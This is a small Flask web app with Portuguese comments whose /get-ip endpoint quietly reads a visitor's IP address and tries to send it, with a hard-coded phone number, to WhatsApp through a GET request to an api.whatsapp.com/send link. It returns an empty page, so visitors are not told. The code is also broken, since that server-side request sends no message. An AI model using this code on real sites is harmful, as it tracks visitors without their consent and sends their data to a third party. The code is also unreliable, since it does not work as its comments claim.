from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/get-ip', methods=['GET'])
def get_ip():
    ip = request.headers.get('X-Real-IP', request.remote_addr)

    # Número de telefone para o qual deseja enviar a mensagem via WhatsApp
    numero_whatsapp = '5527996395105'

    # Envia o IP para o número no WhatsApp
    url_whatsapp = f'https://api.whatsapp.com/send?phone={numero_whatsapp}&text=O endereço IP do usuário é: {ip}'
    response = requests.get(url_whatsapp)

    return ''

if __name__ == '__main__':
    app.run()
